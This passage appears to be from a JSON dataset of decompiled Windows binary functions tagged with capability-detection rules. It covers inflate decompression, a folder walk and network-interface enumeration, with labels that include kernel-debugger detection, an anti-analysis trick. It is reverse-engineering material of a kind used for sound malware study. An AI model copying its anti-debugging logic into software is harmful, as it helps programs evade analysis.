+ *(iVar8 * 2 + 0x4944a4) * 2 + 0x6c) = 0;\n            }\n            piVar2[0x1a] = piVar2 + 0x14b;\n            piVar2[0x12] = piVar2 + 0x14b;\n            piVar2[0x14] = 7;\n            in_EAX = piVar2 + 0xbb;\n            iVar8 = fcn.0046ad44(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n            if (iVar8 == 0) {\n                piVar2[0x19] = 0;\n                *piVar2 = 9;\ncode_r0x0046a2c5:\n                while (piVar2[0x19] <= piVar2[0x17] + piVar2[0x18] && piVar2[0x17] + piVar2[0x18] != piVar2[0x19]) {\n                    while( true ) {\n                        uVar4 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4);\n                        uStack28._1_1_ = uVar4 >> 8;\n                        if (uStack28._1_1_ <= uVar13) break;\n                        if (puVar14 == NULL) goto code_r0x0046a8be;\n                        uVar1 = *arg_ch;\n                        arg_ch = arg_ch + 1;\n                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                        puVar14 = puVar14 + -1;\n                        uVar13 = uVar13 + 8;\n                    }\n                    uStack28._2_2_ = uVar4 >> 0x10;\n                    if (uStack28._2_2_ < 0x10) {\n                        for (; uVar13 < uStack28._1_1_; uVar13 = uVar13 + 8) {\n                            if (puVar14 == NULL) goto code_r0x0046a8be;\n                            uVar1 = *arg_ch;\n                            arg_ch = arg_ch + 1;\n                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                            puVar14 = puVar14 + -1;\n                        }\n                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                        uVar13 = uVar13 - uStack28._1_1_;\n                        iVar8 = piVar2[0x19];\n                        piVar2[0x19] = piVar2[0x19] + 1;\n                        *(piVar2 + iVar8 * 2 + 0x6c) = uStack28._2_2_;\n                    }\n                    else {\n                        if (uStack28._2_2_ == 0x10) {\n                            for (; uVar13 < uStack28._1_1_ + 2; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a8be;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar13 = uVar13 - uStack28._1_1_;\n                            if (piVar2[0x19] == 0) {\n                                in_EAX[6] = \"invalid bit length repeat\";\n                                *piVar2 = 0x12;\n                                break;\n                            }\n                            uVar6 = *(piVar2 + piVar2[0x19] * 2 + 0x6a);\n                            puStack32 = (uStack44 & 3) + 3;\n                            uStack44 = uStack44 >> 2;\n                            uVar13 = uVar13 - 2;\n                        }\n                        else if (uStack28._2_2_ == 0x11) {\n                            for (; uVar13 < uStack28._1_1_ + 3; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a8be;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 7) + 3;\n                            uStack44 = uStack44 >> 3;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 3;\n                        }\n                        else {\n                            for (; uVar13 < uStack28._1_1_ + 7; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a8be;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 0x7f) + 0xb;\n                            uStack44 = uStack44 >> 7;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 7;\n                        }\n                        if (piVar2[0x17] + piVar2[0x18] < piVar2[0x19] + puStack32) {\n                            in_EAX[6] = \"invalid bit length repeat\";\n                            *piVar2 = 0x12;\n                            break;\n                        }\n                        while (puStack32 != NULL) {\n                            iVar8 = piVar2[0x19];\n                            piVar2[0x19] = piVar2[0x19] + 1;\n                            *(piVar2 + iVar8 * 2 + 0x6c) = uVar6;\n                            puStack32 = puStack32 + -1;\n                        }\n                    }\n                }\n                if (*piVar2 != 0x12) {\n                    piVar2[0x1a] = piVar2 + 0x14b;\n                    piVar2[0x12] = piVar2 + 0x14b;\n                    piVar2[0x14] = 9;\n                    in_EAX = piVar2 + 0xbb;\n                    iVar8 = fcn.0046ad44(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n                    if (iVar8 == 0) {\n                        piVar2[0x13] = piVar2[0x1a];\n                        piVar2[0x15] = 6;\n                        in_EAX = piVar2 + 0xbb;\n                        uStack44 = fcn.0046ad44(in_EAX, piVar2 + 0x15, piVar2 + 0x1a);\n                        if (uStack44 == 0) {\n                            *piVar2 = 10;\ncode_r0x0046a388:\n                            if ((puVar14 < 0x6) || (puStack48 < 0x102)) {\n                                for (; uVar12 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4), \n                                    uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                    if (puVar14 == NULL) goto code_r0x0046a8be;\n                                    uVar1 = *arg_ch;\n                                    arg_ch = arg_ch + 1;\n                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                    puVar14 = puVar14 + -1;\n                                }\n                                uStack28._0_1_ = uVar12;\n                                uStack28 = uVar12;\n                                if ((uStack28 != '\\0') && ((uVar12 & 0xf0) == 0)) {\n                                    while( true ) {\n                                        uStack23 = uVar12 >> 8;\n                                        uStack28 = *(piVar2[0x12] +\n                                                    ((((1 << (uStack23 + uStack28 & 0x1f)) - 1U & uStack44) >>\n                                                     (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                        if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                        if (puVar14 == NULL) goto code_r0x0046a8be;\n                                        uVar1 = *arg_ch;\n                                        arg_ch = arg_ch + 1;\n                                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                        puVar14 = puVar14 + -1;\n                                        uVar13 = uVar13 + 8;\n                                    }\n                                    uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                    uVar13 = uVar13 - uStack23;\n                                }\n                                uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                uVar13 = uVar13 - uStack28._1_1_;\n                                piVar2[0xf] = uStack28 >> 0x10;\n                                if (uStack28 == '\\0') {\n                                    *piVar2 = 0xf;\n                                }\n                                else if ((uStack28 & 0x20) == 0) {\n                                    if ((uStack28 & 0x40) == 0) {\n                                        piVar2[0x11] = uStack28 & 0xf;\n                                        *piVar2 = 0xb;\ncode_r0x0046a528:\n                                        if (piVar2[0x11] != 0) {\n                                            for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                if (puVar14 == NULL) goto code_r0x0046a8be;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                            }\n                                            piVar2[0xf] = piVar2[0xf] + ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                            uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                            uVar13 = uVar13 - piVar2[0x11];\n                                        }\n                                        *piVar2 = 0xc;\ncode_r0x0046a571:\n                                        for (; uVar12 = *(piVar2[0x13] +\n                                                         ((1 << (piVar2[0x15] & 0x1f)) - 1U & uStack44) * 4), \n                                            uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                            if (puVar14 == NULL) goto code_r0x0046a8be;\n                                            uVar1 = *arg_ch;\n                                            arg_ch = arg_ch + 1;\n                                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                            puVar14 = puVar14 + -1;\n                                        }\n                                        uStack28 = uVar12;\n                                        if ((uVar12 & 0xf0) == 0) {\n                                            while( true ) {\n                                                cStack24 = uVar12;\n                                                uStack23 = uVar12 >> 8;\n                                                uStack28 = *(piVar2[0x13] +\n                                                            ((((1 << (uStack23 + cStack24 & 0x1f)) - 1U & uStack44) >>\n                                                             (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                                if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                                if (puVar14 == NULL) goto code_r0x0046a8be;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                                uVar13 = uVar13 + 8;\n                                            }\n                                            uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                            uVar13 = uVar13 - uStack23;\n                                        }\n                                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                        uVar13 = uVar13 - uStack28._1_1_;\n                                        if ((uStack28 & 0x40) == 0) {\n                                            piVar2[0x10] = uStack28 >> 0x10;\n                                            piVar2[0x11] = uStack28 & 0xf;\n                                            *piVar2 = 0xd;\ncode_r0x0046a674:\n                                            if (piVar2[0x11] != 0) {\n                                                for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                    if (puVar14 == NULL) goto code_r0x0046a8be;\n                                                    uVar1 = *arg_ch;\n                                                    arg_ch = arg_ch + 1;\n                                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                    puVar14 = puVar14 + -1;\n                                                }\n                                                piVar2[0x10] = piVar2[0x10] +\n                                                               ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                                uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                                uVar13 = uVar13 - piVar2[0x11];\n                                            }\n                                            if (puStack36 + (piVar2[10] - puStack48) < piVar2[0x10]) {\n                                                in_EAX[6] = \"invalid distance too far back\";\n                                                *piVar2 = 0x12;\n                                            }\n                                            else {\n                                                *piVar2 = 0xe;\ncode_r0x0046a6e2:\n                                                if (puStack48 == NULL) goto code_r0x0046a8be;\n                                                if (puStack36 - puStack48 < piVar2[0x10]) {\n                                                    puStack32 = piVar2[0x10] - (puStack36 - puStack48);\n                                                    puVar7 = piVar2[0xb];\n                                                    if (puVar7 < puStack32) {\n                                                        puStack32 = puStack32 + -puVar7;\n                                                        puVar7 = (piVar2[9] - puStack32) + piVar2[0xc];\n                                                    }\n                                                    else {\n                                                        puVar7 = puVar7 + (piVar2[0xc] - puStack32);\n                                                    }\n                                                    if (piVar2[0xf] < puStack32) {\n                                                        puStack32 = piVar2[0xf];\n                                                    }\n                                                }\n                                                else {\n                                                    puStack32 = piVar2[0xf];\n                                                    puVar7 = puVar9 + -piVar2[0x10];\n                                                }\n                                                if (puStack48 < puStack32) {\n                                                    puStack32 = puStack48;\n                                                }\n                                                puStack48 = puStack48 + -puStack32;\n                                                piVar2[0xf] = piVar2[0xf] - puStack32;\n                                                do {\n                                                    *puVar9 = *puVar7;\n                                                    puVar7 = puVar7 + 1;\n                                                    puVar9 = puVar9 + 1;\n                                                    puStack32 = puStack32 + -1;\n                                                } while (puStack32 != NULL);\n                                                if (piVar2[0xf] == 0) {\n                                                    *piVar2 = 10;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            in_EAX[6] = \"invalid distance code\";\n                                            *piVar2 = 0x12;\n                                        }\n                                    }\n                                    else {\n                                        in_EAX[6] = \"invalid literal/length code\";\n                                        *piVar2 = 0x12;\n                                    }\n                                }\n                                else {\n                                    *piVar2 = 3;\n                                }\n                            }\n                            else {\n                                in_EAX[3] = puVar9;\n                                in_EAX[4] = puStack48;\n                                *in_EAX = arg_ch;\n                                in_EAX[1] = puVar14;\n                                piVar2[0xd] = uStack44;\n                                piVar2[0xe] = uVar13;\n                                fcn.00469364();\n                                puVar9 = in_EAX[3];\n                                puStack48 = in_EAX[4];\n                                arg_ch = *in_EAX;\n                                puVar14 = in_EAX[1];\n                                uStack44 = piVar2[0xd];\n                                uVar13 = piVar2[0xe];\n                            }\n                        }\n                        else {\n                            in_EAX[6] = \"invalid distances set\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"invalid literal/lengths set\";\n                        *piVar2 = 0x12;\n                    }\n                }\n            }\n            else {\n                in_EAX[6] = \"invalid code lengths set\";\n                *piVar2 = 0x12;\n            }\n            break;\n        case 9:\n            goto code_r0x0046a2c5;\n        case 10:\n            goto code_r0x0046a388;\n        case 0xb:\n            goto code_r0x0046a528;\n        case 0xc:\n            goto code_r0x0046a571;\n        case 0xd:\n            goto code_r0x0046a674;\n        case 0xe:\n            goto code_r0x0046a6e2;\n        case 0xf:\n            if (puStack48 == NULL) goto code_r0x0046a8be;\n            *puVar9 = *(piVar2 + 0xf);\n            puVar9 = puVar9 + 1;\n            puStack48 = puStack48 + -1;\n            *piVar2 = 10;\n            break;\n        case 0x10:\n            if (piVar2[2] == 0) {\ncode_r0x0046a88b:\n                *piVar2 = 0x11;\n                goto code_r0x0046a891;\n            }\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a8be;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            iVar8 = puStack36 - puStack48;\n            in_EAX[5] = in_EAX[5] + iVar8;\n            piVar2[7] = piVar2[7] + iVar8;\n            if (iVar8 != 0) {\n                puVar7 = fcn.00467904();\n                piVar2[6] = puVar7;\n                in_EAX[0xc] = puVar7;\n            }\n            puStack36 = puStack48;\n            if ((uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000 ==\n                piVar2[6]) {\n                uVar13 = 0;\n                uStack44 = 0;\n                goto code_r0x0046a88b;\n            }\n            in_EAX[6] = \"incorrect data check\";\n            *piVar2 = 0x12;\n            break;\n        case 0x11:\ncode_r0x0046a891:\n            iStack20 = 1;\ncode_r0x0046a8be:\n            in_EAX[3] = puVar9;\n            in_EAX[4] = puStack48;\n            *in_EAX = arg_ch;\n            in_EAX[1] = puVar14;\n            piVar2[0xd] = uStack44;\n            piVar2[0xe] = uVar13;\n            if (((piVar2[9] != 0) || ((*piVar2 < 0x10 && (in_EAX[4] != puStack36)))) &&\n               (iVar8 = fcn.00469a14(),  iVar8 != 0)) {\n                *piVar2 = 0x13;\n                return -4;\n            }\n            iVar8 = puVar3 - in_EAX[1];\n            iVar5 = puStack36 - in_EAX[4];\n            in_EAX[2] = in_EAX[2] + iVar8;\n            in_EAX[5] = in_EAX[5] + iVar5;\n            piVar2[7] = piVar2[7] + iVar5;\n            if ((piVar2[2] != 0) && (iVar5 != 0)) {\n                puVar9 = fcn.00467904();\n                piVar2[6] = puVar9;\n                in_EAX[0xc] = puVar9;\n            }\n            if (piVar2[1] == 0) {\n                iVar11 = 0;\n            }\n            else {\n                iVar11 = 0x40;\n            }\n            if (*piVar2 == 3) {\n                iVar10 = 0x80;\n            }\n            else {\n                iVar10 = 0;\n            }\n            in_EAX[0xb] = iVar11 + piVar2[0xe] + iVar10;\n            if (((iVar8 != 0) || (iVar5 != 0)) && (param_2 != 4)) {\n                return iStack20;\n            }\n            if (iStack20 != 0) {\n                return iStack20;\n            }\n            return -5;\n        case 0x12:\n            iStack20 = -3;\n            goto code_r0x0046a8be;\n        case 0x13:\n            return -4;\n        default:\n            return -2;\n        }\n    } while( true );\n}\n",
        "token_count": 7982
    },
    "0046ce64": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046ce64(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = in_EAX & 1;\n        in_EAX = in_EAX >> 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 160
    },
    "0046d51c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0046d51c(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_208h;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint32_t var_188h;\n    uint var_184h;\n    uint uStackY172;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uchar *puStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    uint *arg_8h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = &stack0xfffffffc;\n    iVar4 = 0x65;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_18h = 0x46d53f;\n    var_19ch = param_2;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.004059cc();\n    var_18h = 0x46d550;\n    fcn.00405fe8();\n    var_1ch = 0x46d87b;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d51c::var_20h;\n    var_28h = 0x46d80a;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d51c::var_2ch;\n    var_18h = &stack0xfffffffc;\n    fcn.00405864();\n    iVar4 = fcn.0040a490();\n    uVar1 = var_188h;\n    while (iVar4 == 0) {\n        var_188h = uVar1;\n        if ((uVar1 & 2) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 0x20) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 1) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 4) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        puVar3 = var_18h;\n        uVar2 = var_1ch;\n        fcn.004058e0();\n        if ((uVar1 & 0x10) == 0) {\n            fcn.00405864();\n            fcn.004059dc();\n            sub.shell32.dll_SHGetFileInfoA();\n            fcn.004057a0();\n            arg_8h = &fcn.0046d51c::var_1b0h;\n            fcn.00405864();\n            fcn.0048cf7c(arg_8h);\n            fcn.0040c900();\n            fcn.0040c900();\n            uStackY132 = 0x46d7b3;\n            fcn.00409e64(var_190h);\n            uStackY136 = 0x46d8dc;\n            uStackY140 = var_10h;\n            uStackY144 = 0x46d8dc;\n            puStackY148 = puVar3;\n            uStackY152 = 0x46d8dc;\n            uStackY156 = uVar2;\n            uStackY160 = 0x46d8dc;\n            uStackY164 = var_28h;\n            var_2ch = 0x46d8e8;\n            uStackY172 = 0x46d7eb;\n            fcn.004058e0();\n        }\n        else {\n            fcn.0048cf7c(&fcn.0046d51c::var_1b0h);\n            fcn.0040c900();\n            fcn.0040c900();\n            var_2ch = 0x46d8e8;\n            fcn.004058e0();\n        }\n        iVar4 = fcn.0040a4e0();\n        uVar1 = var_188h;\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x46d824;\n    fcn.0040a504();\n    var_24h = var_8h;\n    var_28h = 0x46d8f4;\n    var_2ch = var_ch;\n    fcn.004058e0();\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x46d882;\n    var_28h = 0x46d85c;\n    fcn.00405554();\n    var_28h = 0x46d86d;\n    fcn.004060ac();\n    var_28h = 0x46d87a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1435
    },
    "00472fa4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00472fa4(void)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff94c;\n    int32_t iStack1688;\n    uint uStack1684;\n    uchar *puStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    int32_t iStack1664;\n    uint uStack1660;\n    uchar *puStack1656;\n    uint var_664h;\n    uint var_660h;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    uint in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1656 = &stack0xfffffffc;\n    uStack1660 = 0x473224;\n    iStack1664 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff980;\n    uStack1668 = 0x472fdd;\n    fcn.00405530();\n    uStack1668 = 0;\n    uStack1672 = 1;\n    uStack1676 = 2;\n    puStack1680 = 0x472fe8;\n    iVar2 = sub.wsock32.dll_socket();\n    s = iVar2;\n    if (iVar2 != -1) {\n        uStack1684 = 0x4731f1;\n        iStack1688 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff968;\n        puStack1680 = &stack0xfffffffc;\n        iVar3 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar2, 0x4004747f, 0, 0, &fcn.00472fa4::var_658h, 0x400, &fcn.00472fa4::var_8h, 0, 0);\n        if ((iVar3 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar4 = &fcn.00472fa4::var_654h;\n            do {\n                var_1ch = *puVar4;\n                in = puVar4[1];\n                uStack24 = puVar4[2];\n                uStack20 = puVar4[3];\n                sub.wsock32.dll_inet_ntoa(puVar4[1]);\n                fcn.00405728(0x47323c, *in_EAX);\n                fcn.004058e0(0x47324c, 0);\n                var_1ch = puVar4[0xc];\n                in = puVar4[0xd];\n                uStack24 = puVar4[0xe];\n                uStack20 = puVar4[0xf];\n                sub.wsock32.dll_inet_ntoa(puVar4[0xd]);\n                fcn.00405728(0x473258, *in_EAX);\n                fcn.004058e0(0x47324c, 0);\n                var_1ch = puVar4[6];\n                in = puVar4[7];\n                uStack24 = puVar4[8];\n                uStack20 = puVar4[9];\n                sub.wsock32.dll_inet_ntoa(puVar4[7]);\n                fcn.00405728(0x47326c, *in_EAX);\n                fcn.004058e0(0x47324c, 0);\n                uVar1 = puVar4[-1];\n                if ((uVar1 & 1) == 1) {\n                    fcn.004058e0(0x47324c, 0x47328c, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x47324c, 0x4732a4, *in_EAX);\n                }\n                if ((uVar1 & 2) == 2) {\n                    fcn.004058e0(0x47324c, 0x4732bc, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x47324c, 0x4732d8, *in_EAX);\n                }\n                if ((uVar1 & 4) == 4) {\n                    fcn.004058e0(0x47324c, 0x4732f4, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x47324c, 0x473310, *in_EAX);\n                }\n                iVar2 = 0x47324c;\n                fcn.004058e0();\n                puVar4 = puVar4 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar2;\n        in_stack_fffff94c = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff94c;\n    fcn.00405554(0x47322b);\n    return;\n}\n",
        "token_count": 1197
    },
    "00476010": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2d4h\n// WARNING: Variable defined which should be unmapped: var_2cch\n// WARNING: Variable defined which should be unmapped: var_304h\n// WARNING: Variable defined which should be unmapped: var_338h\n// WARNING: Variable defined which should be unmapped: var_34ch\n// WARNING: Variable defined which should be unmapped: var_360h\n// WARNING: Variable defined which should be unmapped: var_374h\n// WARNING: Variable defined which should be unmapped: var_3d4h\n// WARNING: Variable defined which should be unmapped: var_3f8h\n// WARNING: Variable defined which should be unmapped: var_41ch\n// WARNING: Variable defined which should be unmapped: var_440h\n// WARNING: Variable defined which should be unmapped: var_450h\n// WARNING: Variable defined which should be unmapped: var_470h\n// WARNING: Variable defined which should be unmapped: var_494h\n// WARNING: Variable defined which should be unmapped: var_554h\n// WARNING: Variable defined which should be unmapped: var_710h\n// WARNING: Variable defined which should be unmapped: var_70ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00476010(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint *unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t iVar10;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar11;\n    uchar *puVar12;\n    int32_t *piStack2368;\n    uchar *puVar13;\n    uchar *arg_8h;\n    uint *var_7ach;\n    uint *puStack1964;\n    uint *puStack1960;\n    uint uStack1956;\n    uint uStack1952;\n    uchar *puStack1948;\n    uint uStack1944;\n    uint uStack1940;\n    uint uStack1936;\n    int32_t *piStack1932;\n    uint uStack1928;\n    uchar *puStack1924;\n    int32_t iStack1920;\n    int32_t iStack1916;\n    uchar *puStack1912;\n    uchar *puStack1900;\n    uint uStack1896;\n    uint uStack1892;\n    uint uStack1888;\n    uint uStack1884;\n    int32_t *piStack1880;\n    int32_t *piStack1876;\n    uint uStack1872;\n    uint uStack1868;\n    uint uStack1864;\n    int32_t *piStack1860;\n    int32_t *piStack1856;\n    uint *puStack1852;\n    int32_t *piStack1848;\n    uint uStack1844;\n    uint uStack1840;\n    uint uStack1836;\n    int32_t *piStack1832;\n    uint uStack1828;\n    uint uStack1824;\n    uint uStack1820;\n    uchar *puStack1816;\n    uchar *var_710h;\n    uint32_t var_70ch;\n    uchar *puStack1804;\n    int32_t *piStack1800;\n    uint uStack1796;\n    uint *puStack1792;\n    uint uStack1788;\n    uint uStack1784;\n    uint uStack1780;\n    uint uStack1776;\n    uint uStack1772;\n    uint uStack1768;\n    uint uStack1764;\n    uint *puStack1760;\n    int32_t *piStack1756;\n    uint uStack1752;\n    uint *puStack1748;\n    uint uStack1744;\n    uint uStack1740;\n    uint *puStack1736;\n    uint *puStack1732;\n    uint uStack1728;\n    uint uStack1724;\n    uint uStack1720;\n    uchar *puStack1716;\n    uchar *puStack1712;\n    uchar *puStack1708;\n    uint uStack1704;\n    uint uStack1700;\n    uint uStack1696;\n    code *pcStack1692;\n    int32_t iStack1688;\n    uint uStack1684;\n    uint *puStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint *puStack1668;\n    uchar *puStack1664;\n    int32_t *piStack1660;\n    uint uStack1656;\n    uint *puStack1652;\n    uint uStack1648;\n    int32_t *piStack1644;\n    uint *puStack1640;\n    uchar *arg_8h_00;\n    uint *puStack1628;\n    uint uStack1612;\n    uint uStack1600;\n    uint uStack1596;\n    uchar *puStack1592;\n    uint uStack1588;\n    uint uStack1584;\n    uint uStack1580;\n    uint uStack1576;\n    int32_t *var_620h;\n    uint *var_61ch;\n    uint var_618h;\n    uint uStack1560;\n    uint uStack1556;\n    int32_t *piStack1552;\n    int32_t *piStack1548;\n    uint *puStack1544;\n    uint uStack1540;\n    uint uStack1536;\n    uint uStack1532;\n    uint uStack1528;\n    uint uStack1524;\n    uchar *puStack1520;\n    uchar *puStack1516;\n    uchar *arg_8h_01;\n    uint *puStack1504;\n    uchar *arg_8h_02;\n    uint *puStack1492;\n    uint *in_stack_fffffa34;\n    uint uStack1468;\n    uint uStack1464;\n    uint uStack1460;\n    uint var_5ach;\n    uint var_5a8h;\n    uint *var_5a4h;\n    uint var_5a0h;\n    uint var_59ch;\n    int32_t var_598h;\n    code *var_594h;\n    uint *var_590h;\n    uint var_58ch;\n    uint *var_588h;\n    uint var_584h;\n    int32_t *var_580h;\n    uint *var_57ch;\n    uint *var_578h;\n    code *var_574h;\n    uint *var_570h;\n    uint var_56ch;\n    uint *var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint *var_55ch;\n    uint *var_558h;\n    int32_t *var_554h;\n    uint var_550h;\n    int32_t var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_540h;\n    uint 